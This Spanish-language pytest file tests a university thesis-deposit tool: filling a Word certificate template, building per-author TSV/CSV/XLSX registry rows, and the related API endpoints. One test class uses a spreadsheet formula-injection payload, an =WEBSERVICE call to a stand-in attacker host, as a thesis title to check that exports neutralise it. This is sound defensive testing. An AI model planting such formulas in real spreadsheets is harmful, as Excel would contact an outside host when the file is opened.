"""Tests de la constancia de depósito (Modelo B) y la fila de registro.

Cubre:

- Unitario: la fila TSV (orden exacto de columnas, convenciones del
  registro: DD/MM con barra final, HORA 24h, fecha del documento en
  español), el armado por autor (alineación de matrículas, errores por
  datos faltantes) y el llenado de la plantilla.
- Llenado contra dos plantillas: una SINTÉTICA determinista (misma
  estructura de campos de Word que produce el formato OOXML, incluida
  un fldSimple) que corre siempre, y la REAL de recursos/ cuando existe
  (fidelidad del artefacto oficial; se salta en CI, donde recursos/ no
  está versionado).
- Contrato: los endpoints POST /constancia y POST /fila-registro sobre
  la app real, incluyendo los 422 (datos) y 500 (configuración).

Uso:
    pytest tests/test_constancia.py -v
"""

import io
import tempfile
import zipfile
from datetime import datetime
from functools import cache
from pathlib import Path

import pytest
from conftest import CLIENTE, RECURSOS_DIR
from docx import Document
from docx.oxml import OxmlElement
from docx.oxml.ns import qn

from validator.constancia import (
    DatosConstancia,
    ErrorDatosConstancia,
    constancias_por_autor,
    llenar_constancia,
)

RUTA_PLANTILLA_REAL = RECURSOS_DIR / "TESIS DIGITAL MODELO B-2026.docx"

HANDLE = "https://hdl.handle.net/20.500.14414/26042"
TIMESTAMP = "2026-01-20T18:10:00"
FIRMA = "Lic. José Prueba"


# ---------------------------------------------------------------------------
# Plantilla sintética: misma estructura de MERGEFIELD que emite Word
# ---------------------------------------------------------------------------

CAMPOS_PLANTILLA = (
    "TESIS__TSP",
    "BACHILLER__LICENCIADO",
    "N_MATRIC",
    "DD",
    "MM",
    "AA",
    "HORA",
    "AÑO",
    "DIRECCION_URL",
    "FECHA_DEL_DOC",
    "ESCUELAS",
)


def _agregar_run_texto(parrafo, texto: str) -> None:
    run = OxmlElement("w:r")
    t = OxmlElement("w:t")
    t.text = texto
    run.append(t)
    parrafo._p.append(run)


def _agregar_campo_complejo(parrafo, nombre: str, resultado: str) -> None:
    """Campo MERGEFIELD complejo: begin → instrText → separate → resultado → end."""
    run = OxmlElement("w:r")
    fld = OxmlElement("w:fldChar")
    fld.set(qn("w:fldCharType"), "begin")
    run.append(fld)
    parrafo._p.append(run)

    run = OxmlElement("w:r")
    instr = OxmlElement("w:instrText")
    instr.set(qn("xml:space"), "preserve")
    instr.text = f' MERGEFIELD "{nombre}" \\* MERGEFORMAT '
    run.append(instr)
    parrafo._p.append(run)

    run = OxmlElement("w:r")
    fld = OxmlElement("w:fldChar")
    fld.set(qn("w:fldCharType"), "separate")
    run.append(fld)
    parrafo._p.append(run)

    _agregar_run_texto(parrafo, resultado)

    run = OxmlElement("w:r")
    fld = OxmlElement("w:fldChar")
    fld.set(qn("w:fldCharType"), "end")
    run.append(fld)
    parrafo._p.append(run)


def _agregar_campo_simple(parrafo, nombre: str, resultado: str) -> None:
    """Campo MERGEFIELD simple (w:fldSimple) con resultado cacheado."""
    fld = OxmlElement("w:fldSimple")
    fld.set(qn("w:instr"), f' MERGEFIELD "{nombre}" ')
    run = OxmlElement("w:r")
    t = OxmlElement("w:t")
    t.text = resultado
    run.append(t)
    fld.append(run)
    parrafo._p.append(fld)


@cache
def _plantilla_sintetica() -> Path:
    """Construye (una vez) la plantilla sintética con los 11 campos.

    ESCUELAS entra como fldSimple para cubrir también esa rama del
    reemplazador; el resto como campos complejos, como los emite Word.
    """
    doc = Document()
    doc.add_paragraph("UNIVERSIDAD NACIONAL DE TRUJILLO")

    cuerpo = doc.add_paragraph()
    _agregar_run_texto(cuerpo, "Que la Tesis titulada: ")
    _agregar_campo_complejo(cuerpo, "TESIS__TSP", "valor viejo")
    _agregar_run_texto(cuerpo, " presentada por ")
    _agregar_campo_complejo(cuerpo, "BACHILLER__LICENCIADO", "valor viejo")
    _agregar_run_texto(cuerpo, ", con matrícula N° ")
    _agregar_campo_complejo(cuerpo, "N_MATRIC", "valor viejo")

    fechas = doc.add_paragraph()
    for nombre in ("DD", "MM", "AA", "HORA", "AÑO"):
        _agregar_campo_complejo(fechas, nombre, "0")

    final = doc.add_paragraph()
    _agregar_campo_complejo(final, "DIRECCION_URL", "valor viejo")
    _agregar_campo_complejo(final, "FECHA_DEL_DOC", "valor viejo")
    _agregar_campo_simple(final, "ESCUELAS", "valor viejo")

    # Fuera del árbol del repo: es un artefacto generado (higiene de AGENTS.md).
    destino = Path(tempfile.mkdtemp(prefix="vistobueno-constancia-")) / "plantilla_sintetica.docx"
    doc.save(str(destino))
    return destino


@cache
def _plantilla_sintetica_escuela_compleja() -> Path:
    """Variante con ESCUELAS como campo COMPLEJO (como en la plantilla real).

    La variante principal usa fldSimple para cubrir esa rama; esta cubre
    la forma que el Modelo B oficial realmente usa (hallazgo 6 de la
    revisión del PR #55: el sintético debe cubrir ambos mecanismos).
    """
    doc = Document()
    doc.add_paragraph("UNIVERSIDAD NACIONAL DE TRUJILLO")

    cuerpo = doc.add_paragraph()
    _agregar_run_texto(cuerpo, "Escuela: ")
    _agregar_campo_complejo(cuerpo, "ESCUELAS", "valor viejo")

    destino = (
        Path(tempfile.mkdtemp(prefix="vistobueno-constancia-")) / "plantilla_escuela_compleja.docx"
    )
    doc.save(str(destino))
    return destino


@pytest.fixture(autouse=True)
def _entorno_constancia(monkeypatch):
    """Firma y plantilla deterministas para toda la suite."""
    monkeypatch.setenv("VISTOBUENO_FIRMA", FIRMA)
    monkeypatch.setenv("VISTOBUENO_PLANTILLA_CONSTANCIA", str(_plantilla_sintetica()))
    yield


def _document_xml(contenido: bytes) -> str:
    """Lee el word/document.xml de un .docx en bytes."""
    with zipfile.ZipFile(io.BytesIO(contenido)) as zf:
        return zf.read("word/document.xml").decode("utf-8")


# ---------------------------------------------------------------------------
# Unitario: datos y fila de registro
# ---------------------------------------------------------------------------


def _datos(autor: str = "Cerna Vidal Kassiel", matricula: str = "15185003-20") -> DatosConstancia:
    return DatosConstancia(
        titulo="Taller de dramatización de títeres",
        autor=autor,
        matricula=matricula,
        momento=datetime(2026, 1, 20, 18, 10, 0),
        handle=HANDLE,
        firma=FIRMA,
        escuela="Educación Primaria",
    )


class TestFilaRegistro:
    """La fila TSV respeta el orden y las convenciones del registro."""

    def test_fila_exacta(self):
        """Las 13 columnas del registro, con DD/MM con barra final y HORA 24h."""
        fila = _datos().fila_registro()
        assert fila == (
            "\tTaller de dramatización de títeres\t"
            "Cerna Vidal Kassiel\t15185003-20\t"
            "20/\t01/\t2026\t18:10:00\t"
            f"{HANDLE}\t{FIRMA}\t"
            "Trujillo, 20 de enero de 2026\t"
            "Educación Primaria\t2026"
        )

    def test_fila_tiene_doce_tabuladores(self):
        """13 columnas = 12 separadores; la N° inicial va vacía."""
        assert _datos().fila_registro().count("\t") == 12

    def test_fila_limpia_tabuladores_y_saltos(self):
        """Un título con tabulador no rompe la estructura al pegarlo."""
        datos = _datos()
        datos_titulo_sucio = DatosConstancia(
            titulo="Título\tcon tab\ny salto",
            autor=datos.autor,
            matricula=datos.matricula,
            momento=datos.momento,
            handle=datos.handle,
            firma=datos.firma,
            escuela=datos.escuela,
        )
        fila = datos_titulo_sucio.fila_registro()
        assert "Título con tab y salto" in fila
        assert fila.count("\t") == 12

    def test_fila_sin_escuela_deja_columna_vacia(self):
        """Sin escuela detectada, la columna ESCUELAS queda vacía."""
        datos = DatosConstancia(
            titulo="T",
            autor="A",
            matricula="M",
            momento=datetime(2026, 1, 20, 18, 10, 0),
            handle=HANDLE,
            firma=FIRMA,
        )
        assert _datos().fila_registro().endswith("\t2026")
        assert "Educación" not in datos.fila_registro()

    def test_fecha_del_documento_en_espanol(self):
        """La fecha del documento usa los meses en español, sin locale."""
        assert _datos().fecha_del_doc() == "Trujillo, 20 de enero de 2026"
        diciembre = DatosConstancia(
            titulo="T",
            autor="A",
            matricula="M",
            momento=datetime(2026, 12, 5, 9, 0, 0),
            handle=HANDLE,
            firma=FIRMA,
        )
        assert diciembre.fecha_del_doc() == "Trujillo, 5 de diciembre de 2026"


# ---------------------------------------------------------------------------
# Unitario: armado por autor desde la ficha
# ---------------------------------------------------------------------------


def _ficha(titulo="Tesis de prueba", autores=None, matriculas=None, escuela="Educación Primaria"):
    return {
        "extraidos": [
            {"campo": "dc.title", "valor": titulo, "pagina": 1, "detectado": True},
            {
                "campo": "dc.contributor.author",
                "valor": autores if autores is not None else ["Cerna Vidal Kassiel"],
                "pagina": 1,
                "detectado": True,
            },
            {"campo": "escuela", "valor": escuela, "pagina": 1, "detectado": True},
        ],
        "manuales": [
            {
                "campo": "matricula",
                "valor": matriculas if matriculas is not None else ["15185003-20"],
            },
        ],
    }


class TestConstanciasPorAutor:
    """Una constancia por autor, con matrículas alineadas por posición."""

    def test_un_autor(self):
        datos = constancias_por_autor(_ficha(), HANDLE, datetime(2026, 1, 20, 18, 10, 0), FIRMA)
        assert len(datos) == 1
        assert datos[0].autor == "Cerna Vidal Kassiel"
        assert datos[0].matricula == "15185003-20"

    def test_dos_autores_dos_matriculas(self):
        """Evidencia del registro: mismo handle, una fila por estudiante."""
        datos = constancias_por_autor(
            _ficha(
                autores=["Cerna Vidal Kassiel", "Barrueto Escobedo Dora Elizabeth"],
                matriculas=["15185003-20", "10130005-20"],
            ),
            HANDLE,
            datetime(2026, 1, 20, 18, 10, 0),
            FIRMA,
        )
        assert len(datos) == 2
        assert [d.autor for d in datos] == [
            "Cerna Vidal Kassiel",
            "Barrueto Escobedo Dora Elizabeth",
        ]
        assert [d.matricula for d in datos] == ["15185003-20", "10130005-20"]
        assert all(d.handle == HANDLE for d in datos)

    def test_matricula_como_texto_unico(self):
        """La matrícula también puede viajar como texto simple (un autor)."""
        datos = constancias_por_autor(
            _ficha(matriculas="15185003-20"),
            HANDLE,
            datetime(2026, 1, 20, 18, 10, 0),
            FIRMA,
        )
        assert datos[0].matricula == "15185003-20"

    def test_matriculas_insuficientes_es_error(self):
        """Dos autores con una matrícula → ErrorDatosConstancia."""
        with pytest.raises(ErrorDatosConstancia, match="matrícula"):
            constancias_por_autor(
                _ficha(autores=["A", "B"], matriculas=["solo-una"]),
                HANDLE,
                datetime(2026, 1, 20, 18, 10, 0),
                FIRMA,
            )

    def test_sin_titulo_es_error(self):
        with pytest.raises(ErrorDatosConstancia, match="título"):
            constancias_por_autor(
                _ficha(titulo=None), HANDLE, datetime(2026, 1, 20, 18, 10, 0), FIRMA
            )

    def test_sin_autores_es_error(self):
        with pytest.raises(ErrorDatosConstancia, match="autores"):
            constancias_por_autor(
                _ficha(autores=[]), HANDLE, datetime(2026, 1, 20, 18, 10, 0), FIRMA
            )

    def test_sin_handle_es_error(self):
        with pytest.raises(ErrorDatosConstancia, match="handle"):
            constancias_por_autor(_ficha(), "  ", datetime(2026, 1, 20, 18, 10, 0), FIRMA)


# ---------------------------------------------------------------------------
# Llenado de la plantilla
# ---------------------------------------------------------------------------


class TestLlenadoConstancia:
    """El .docx de salida lleva los valores y ningún MERGEFIELD."""

    def test_plantilla_sintetica_llena(self):
        contenido = llenar_constancia(_plantilla_sintetica(), _datos())
        xml = _document_xml(contenido)

        assert contenido.startswith(b"PK\x03\x04")  # es un ZIP/DOCX válido
        assert "MERGEFIELD" not in xml  # ningún código de campo sobrevive
        for valor in (
            "Taller de dramatización de títeres",
            "Cerna Vidal Kassiel",
            "15185003-20",
            "20/",
            "01/",
            "18:10:00",
            HANDLE,
            "Trujillo, 20 de enero de 2026",
            "Educación Primaria",  # entró por la rama fldSimple
        ):
            assert valor in xml, f"Falta en la constancia: {valor}"
        assert "valor viejo" not in xml  # el resultado cacheado se reemplazó

    def test_plantilla_inexistente_es_error_de_configuracion(self):
        from validator.constancia import ErrorConfiguracionConstancia

        with pytest.raises(ErrorConfiguracionConstancia, match="plantilla"):
            llenar_constancia(Path("/no/existe/modelo.docx"), _datos())

    @pytest.mark.skipif(not RUTA_PLANTILLA_REAL.exists(), reason="sin plantilla real en recursos/")
    def test_plantilla_real_oficial(self):
        """Fidelidad contra el Modelo B oficial: los 11 campos, ninguno sobrevive."""
        contenido = llenar_constancia(RUTA_PLANTILLA_REAL, _datos())
        xml = _document_xml(contenido)

        assert "MERGEFIELD" not in xml
        for valor in (
            "Taller de dramatización de títeres",
            "Cerna Vidal Kassiel",
            "15185003-20",
            "20/",
            "01/",
            "2026",
            "18:10:00",
            HANDLE,
            "Trujillo, 20 de enero de 2026",
            "Educación Primaria",
        ):
            assert valor in xml, f"Falta en la constancia real: {valor}"

    def test_escuela_como_campo_complejo_tambien_se_reemplaza(self):
        """Hallazgo 6: el sintético cubre el mecanismo del Modelo B real.

        La plantilla oficial usa campo complejo para ESCUELAS; la
        variante sintética original usaba fldSimple. Esta variante
        asegura que el reemplazador cubre AMBOS mecanismos por separado.
        """
        contenido = llenar_constancia(_plantilla_sintetica_escuela_compleja(), _datos())
        xml = _document_xml(contenido)

        assert "MERGEFIELD" not in xml
        assert "Educación Primaria" in xml
        assert "valor viejo" not in xml


# ---------------------------------------------------------------------------
# Contrato: endpoints POST /constancia y POST /fila-registro
# ---------------------------------------------------------------------------


def _solicitud(autores=None, matriculas=None, indice=0):
    ficha = _ficha(
        autores=autores,
        matriculas=matriculas,
    )
    return {"ficha": ficha, "handle": HANDLE, "timestamp": TIMESTAMP, "indice_autor": indice}


class TestEndpointConstancia:
    """POST /constancia: descarga binaria, una por autor."""

    def test_descarga_docx(self):
        respuesta = CLIENTE.post("/constancia", json=_solicitud())
        assert respuesta.status_code == 200
        assert respuesta.headers["content-type"].startswith(
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        )
        assert "attachment" in respuesta.headers["content-disposition"]
        assert "Cerna Vidal Kassiel" in respuesta.headers["content-disposition"]
        assert respuesta.content.startswith(b"PK\x03\x04")

        xml = _document_xml(respuesta.content)
        assert "15185003-20" in xml
        assert "MERGEFIELD" not in xml

    def test_dos_autores_descargas_distintas(self):
        """Cada autor descarga SU constancia con SU matrícula."""
        base = _solicitud(
            autores=["Cerna Vidal Kassiel", "Barrueto Escobedo Dora Elizabeth"],
            matriculas=["15185003-20", "10130005-20"],
        )
        primera = CLIENTE.post("/constancia", json={**base, "indice_autor": 0})
        segunda = CLIENTE.post("/constancia", json={**base, "indice_autor": 1})
        assert primera.status_code == segunda.status_code == 200

        xml1 = _document_xml(primera.content)
        xml2 = _document_xml(segunda.content)
        assert "15185003-20" in xml1 and "10130005-20" not in xml1
        assert "10130005-20" in xml2 and "15185003-20" not in xml2
        # El título y el handle son de la tesis: compartidos.
        assert "Tesis de prueba" in xml1 and "Tesis de prueba" in xml2
        assert HANDLE in xml1 and HANDLE in xml2

    def test_indice_fuera_de_rango_es_422(self):
        respuesta = CLIENTE.post("/constancia", json=_solicitud(indice=5))
        assert respuesta.status_code == 422
        assert "fuera de rango" in respuesta.json()["detail"]

    def test_timestamp_invalido_es_422(self):
        solicitud = _solicitud()
        solicitud["timestamp"] = "ayer"
        respuesta = CLIENTE.post("/constancia", json=solicitud)
        assert respuesta.status_code == 422
        assert "Timestamp inválido" in respuesta.json()["detail"]

    def test_sin_titulo_es_422(self):
        solicitud = _solicitud()
        solicitud["ficha"]["extraidos"][0]["valor"] = None
        respuesta = CLIENTE.post("/constancia", json=solicitud)
        assert respuesta.status_code == 422
        assert "título" in respuesta.json()["detail"]

    def test_sin_firma_configurada_es_500(self, monkeypatch):
        monkeypatch.delenv("VISTOBUENO_FIRMA")
        respuesta = CLIENTE.post("/constancia", json=_solicitud())
        assert respuesta.status_code == 500
        assert "VISTOBUENO_FIRMA" in respuesta.json()["detail"]

    def test_plantilla_ausente_es_500(self, monkeypatch):
        monkeypatch.setenv("VISTOBUENO_PLANTILLA_CONSTANCIA", "/no/existe.docx")
        respuesta = CLIENTE.post("/constancia", json=_solicitud())
        assert respuesta.status_code == 500
        assert "plantilla" in respuesta.json()["detail"].lower()


class TestEndpointFilaRegistro:
    """POST /fila-registro: una fila TSV por autor."""

    def test_un_autor_una_fila(self):
        respuesta = CLIENTE.post("/fila-registro", json=_solicitud())
        assert respuesta.status_code == 200
        filas = respuesta.json()["filas"]
        assert len(filas) == 1
        assert filas[0].startswith("\tTesis de prueba\t")
        assert HANDLE in filas[0]
        assert FIRMA in filas[0]

    def test_dos_autores_dos_filas_mismo_handle(self):
        """Evidencia del registro: dos filas, mismo handle y hora, distinta matrícula."""
        respuesta = CLIENTE.post(
            "/fila-registro",
            json=_solicitud(
                autores=["Cerna Vidal Kassiel", "Barrueto Escobedo Dora Elizabeth"],
                matriculas=["15185003-20", "10130005-20"],
            ),
        )
        assert respuesta.status_code == 200
        filas = respuesta.json()["filas"]
        assert len(filas) == 2
        assert "15185003-20" in filas[0] and "10130005-20" not in filas[0]
        assert "10130005-20" in filas[1]
        assert HANDLE in filas[0] and HANDLE in filas[1]
        assert "18:10:00" in filas[0] and "18:10:00" in filas[1]

    def test_matriculas_insuficientes_es_422(self):
        solicitud = _solicitud(
            autores=["A", "B"],
            matriculas=["solo-una"],
        )
        respuesta = CLIENTE.post("/fila-registro", json=solicitud)
        assert respuesta.status_code == 422
        assert "matrícula" in respuesta.json()["detail"]


# ---------------------------------------------------------------------------
# Formatos descargables del registro (hallazgo 11, revisión PR #55)
# ---------------------------------------------------------------------------


class TestFormatosRegistro:
    """POST /fila-registro?formato=tsv|csv|xlsx: archivo, no copiar-pegar."""

    @staticmethod
    def _solicitud_dos_autores():
        return _solicitud(
            autores=["Cerna Vidal Kassiel", "Barrueto Escobedo Dora Elizabeth"],
            matriculas=["15185003-20", "10130005-20"],
        )

    def test_formato_tsv_descargable(self):
        """tsv: text/tab-separated-values, BOM UTF-8, adjunto, dos filas."""
        respuesta = CLIENTE.post("/fila-registro?formato=tsv", json=self._solicitud_dos_autores())
        assert respuesta.status_code == 200
        assert respuesta.headers["content-type"].startswith("text/tab-separated-values")
        assert "attachment" in respuesta.headers["content-disposition"]
        assert respuesta.headers["content-disposition"].endswith('.tsv"')

        texto = respuesta.content.decode("utf-8")
        assert texto.startswith("\ufeff")  # BOM: Excel detecta UTF-8
        # splitlines (no strip): la fila empieza con tabulador (N° vacía)
        lineas = texto.lstrip("\ufeff").splitlines()
        assert len(lineas) == 2
        assert lineas[0].count("\t") == 12
        assert HANDLE in lineas[0]

    def test_formato_csv_con_punto_y_coma_y_bom(self):
        """csv: separador ';' (regional español), BOM, citas en campos con ';'."""
        respuesta = CLIENTE.post("/fila-registro?formato=csv", json=self._solicitud_dos_autores())
        assert respuesta.status_code == 200
        assert respuesta.headers["content-type"].startswith("text/csv")

        texto = respuesta.content.decode("utf-8")
        assert texto.startswith("\ufeff")
        lineas = texto.lstrip("\ufeff").splitlines()
        assert len(lineas) == 2
        # 13 columnas por ';'
        assert lineas[0].count(";") == 12

    def test_formato_csv_cita_campo_con_separador(self):
        """Un título con ';' viaja citado: la fila no se descuadra."""
        solicitud = _solicitud()
        solicitud["ficha"]["extraidos"][0]["valor"] = "Título; con; punto y coma"
        respuesta = CLIENTE.post("/fila-registro?formato=csv", json=solicitud)
        assert respuesta.status_code == 200
        linea = respuesta.content.decode("utf-8").lstrip("\ufeff").strip()
        assert '"Título; con; punto y coma"' in linea

    def test_formato_xlsx_con_encabezado(self):
        """xlsx: libro de una hoja, encabezado = COLUMNAS_REGISTRO, PK."""
        respuesta = CLIENTE.post("/fila-registro?formato=xlsx", json=self._solicitud_dos_autores())
        assert respuesta.status_code == 200
        assert respuesta.headers["content-type"] == (
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
        )
        assert respuesta.content.startswith(b"PK\x03\x04")

        import io

        from openpyxl import load_workbook

        libro = load_workbook(io.BytesIO(respuesta.content))
        hoja = libro.active
        encabezado = [celda.value for celda in hoja[1]]
        from validator.constancia import COLUMNAS_REGISTRO

        assert tuple(encabezado) == COLUMNAS_REGISTRO
        assert hoja[2][0].value is None  # N° va vacía (numeración del registro)
        assert hoja[2][3].value == "15185003-20"  # N° MATRIC., autor 1
        assert hoja[3][3].value == "10130005-20"  # autor 2

    def test_formato_desconocido_es_422(self):
        respuesta = CLIENTE.post("/fila-registro?formato=pdf", json=_solicitud())
        assert respuesta.status_code == 422

    def test_formato_json_por_defecto_retrocompatible(self):
        respuesta = CLIENTE.post("/fila-registro", json=_solicitud())
        assert respuesta.status_code == 200
        assert isinstance(respuesta.json()["filas"], list)


class TestFormatoZipConstancia:
    """POST /constancia?formato=zip: constancia + registro del autor en un paquete."""

    def test_zip_contiene_constancia_y_registro(self):
        """Un .zip por autor: la constancia .docx y su fila en .csv."""
        respuesta = CLIENTE.post("/constancia?formato=zip", json=_solicitud())
        assert respuesta.status_code == 200
        assert respuesta.headers["content-type"] == "application/zip"
        assert "attachment" in respuesta.headers["content-disposition"]
        assert respuesta.headers["content-disposition"].endswith('.zip"')
        assert respuesta.content.startswith(b"PK\x03\x04")

        with zipfile.ZipFile(io.BytesIO(respuesta.content)) as paquete:
            nombres = paquete.namelist()
            assert len(nombres) == 2
            assert any(n.endswith(".docx") for n in nombres)
            assert "registro.csv" in nombres

            # La constancia dentro del zip es la del autor pedido.
            docx_nombre = next(n for n in nombres if n.endswith(".docx"))
            # Descomprimir el .docx interno para leer su document.xml:
            with zipfile.ZipFile(io.BytesIO(paquete.read(docx_nombre))) as docx:
                xml = docx.read("word/document.xml").decode("utf-8")
            assert "15185003-20" in xml
            assert "MERGEFIELD" not in xml

            # El registro del autor, con BOM y sus columnas.
            csv = paquete.read("registro.csv").decode("utf-8")
            assert csv.startswith("\ufeff")
            assert "15185003-20" in csv
            assert HANDLE in csv

    def test_zip_por_autor_lleva_su_matricula(self):
        base = _solicitud(
            autores=["Cerna Vidal Kassiel", "Barrueto Escobedo Dora Elizabeth"],
            matriculas=["15185003-20", "10130005-20"],
        )
        primera = CLIENTE.post("/constancia?formato=zip", json={**base, "indice_autor": 0})
        segunda = CLIENTE.post("/constancia?formato=zip", json={**base, "indice_autor": 1})
        assert primera.status_code == segunda.status_code == 200

        with zipfile.ZipFile(io.BytesIO(segunda.content)) as paquete:
            csv = paquete.read("registro.csv").decode("utf-8")
        assert "10130005-20" in csv and "15185003-20" not in csv

    def test_formato_desconocido_es_422(self):
        respuesta = CLIENTE.post("/constancia?formato=pdf", json=_solicitud())
        assert respuesta.status_code == 422

    def test_docx_por_defecto_retrocompatible(self):
        respuesta = CLIENTE.post("/constancia?formato=docx", json=_solicitud())
        assert respuesta.status_code == 200
        assert respuesta.headers["content-type"].startswith(
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
        )


class TestNeutralizacionFormulas:
    """Hallazgo 14 (revisión, 2a pasada): el título y los demás campos
    salen del DOCX del estudiante (input no confiable). Sin neutralizar,
    un "=WEBSERVICE(...)" en la carátula llega crudo al csv/xlsx y
    Excel lo evalúa al abrir."""

    @staticmethod
    def _solicitud_formula():
        solicitud = _solicitud()
        solicitud["ficha"]["extraidos"][0]["valor"] = '=WEBSERVICE("http://evil.example/ping")'
        return solicitud

    def test_csv_neutraliza_formula_en_el_titulo(self):
        respuesta = CLIENTE.post("/fila-registro?formato=csv", json=self._solicitud_formula())
        assert respuesta.status_code == 200
        texto = respuesta.content.decode("utf-8").lstrip("\ufeff")
        # El campo empieza con comilla simple antes del =.
        assert "'=WEBSERVICE" in texto
        assert not texto.split("\n")[0].startswith("=WEBSERVICE")

    def test_xlsx_neutraliza_formula_en_el_titulo(self):
        import io

        from openpyxl import load_workbook

        respuesta = CLIENTE.post("/fila-registro?formato=xlsx", json=self._solicitud_formula())
        assert respuesta.status_code == 200
        libro = load_workbook(io.BytesIO(respuesta.content))
        hoja = libro.active
        # La celda del título (columna 2 = TESIS/TSP) debe ser TEXTO, no fórmula.
        celda = hoja[2][1]  # fila 2, col 2 (0-indexed en openpyxl)
        assert celda.data_type != "f", (
            f"la celda quedó como FÓRMULA: data_type={celda.data_type}, valor={celda.value!r}"
        )
        assert celda.value.startswith("'=WEBSERVICE") or celda.value.startswith("=WEBSERVICE")
        if celda.value.startswith("="):
            # openpyxl puede haberla normalizado a fórmula: con la comilla
            # delante debe haber quedado como texto (data_type != 'f').
            assert celda.data_type == "s", f"sin la comilla: {celda.value!r}"

    def test_tsv_neutraliza_formula(self):
        respuesta = CLIENTE.post("/fila-registro?formato=tsv", json=self._solicitud_formula())
        assert respuesta.status_code == 200
        texto = respuesta.content.decode("utf-8").lstrip("\ufeff")
        assert "'=WEBSERVICE" in texto

    def test_campos_normales_no_se_tocan(self):
        """Un título sin prefijo de fórmula llega íntegro: sin comilla extra."""
        respuesta = CLIENTE.post("/fila-registro?formato=csv", json=_solicitud())
        assert respuesta.status_code == 200
        texto = respuesta.content.decode("utf-8")
        assert "'Tesis" not in texto  # sin comilla ante un título normal
